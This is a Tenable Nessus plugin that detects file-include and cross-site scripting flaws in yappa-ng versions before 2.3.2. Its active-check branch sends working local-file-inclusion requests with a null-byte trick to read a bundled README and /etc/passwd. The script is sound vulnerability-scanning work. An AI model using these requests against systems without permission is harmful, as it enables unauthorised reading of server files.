#
# (C) Tenable Network Security
#
# 

  desc["english"] = "
The version of yappa-ng installed on the remote host is prone to
multiple file include and cross-site scripting vulnerabilities due to
its failure to sanitize user-supplied script input when calling
various include scripts directly.

By exploiting the file include vulnerabilities, an attacker can read
arbitrary files on the remote host and possibly even run arbitrary
code, subject to the privileges of the web server process.  And by
exploiting the cross-site scripting vulnerabilties, he can cause
arbitrary script and HTML code to be run in a user's browser within
the context of the affected web site. 

Solution : Upgrade to yappa-ng 2.3.2 or later.

Risk factor : Medium";


if (description) {
  script_id(18150);
  script_version("$Revision: 1.1 $");

  script_bugtraq_id(13371, 13372);

  name["english"] = "Multiple Vulnerabilities in yappa-ng < 2.3.2";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in yappa-ng < 2.3.2";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Search for yappa-ng.
foreach dir (cgi_dirs()) {
  # Grab index.php.
  req = http_get(item:string(dir, "/index.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it's yappa-ng...
  pat = ">Powered by yappa-ng ([^(]+) \(.+ >> <a href=[^>]+>yappa-ng Homepage";
  if (egrep(string:res, pattern:pat, icase:TRUE)) {
    # Check for the vulnerability.
    #
    # - if safe checks are enabled...
    if (safe_checks()) {
      # Get the version number.
      matches = egrep(pattern:pat, string:res, icase:TRUE);
      foreach match (split(matches)) {
        match = chomp(match);
        ver = eregmatch(pattern:pat, string:match);
        if (!isnull(ver)) {
          ver = ver[1];
          break;
        }
      }

      # Test the version number.
      if (ver && ver  =~ "^([01]\.|2\.([0-2]\.|3\.[01]([^0-9]|$)))") {
        desc = str_replace(
          string:desc["english"],
          find:"Solution :",
          replace:string(
            "***** Nessus has determined the vulnerability exists on the remote\n",
            "***** host simply by looking at the version number of yappa-ng\n",
            "***** installed there.\n",
            "\n",
            "Solution :"
          )
        );
        security_warning(port:port, data:desc);
        exit(0);
      }
    }
    # - otherwise, try to exploit the file include vulnerability.
    else {
      # Try to grab a file included in the distribution.
      req = http_get(
        item:string(
          dir, "/src/main.inc.php?",
          "config[path_src_include]=../docs/_README.FIRST.html%00"
        ),
        port:port
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # It's a problem if we could retrieve the file.
      if (egrep(string:res, pattern:"<title>yappa-ng: README\.FIRST</title>", icase:TRUE)) {
        security_warning(port);
        exit(0);
      }

      # If that failed, try to grab /etc/passwd.
      req = http_get(
        item:string(
          dir, "/src/main.inc.php?",
          "config[path_src_include]=/etc/passwd%00"
        ),
        port:port
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # It's a problem if there's an entry for root.
      if (egrep(string:res, pattern:"root:.+:0:")) {
        security_warning(port);
        exit(0);
      }
    }
  }
}

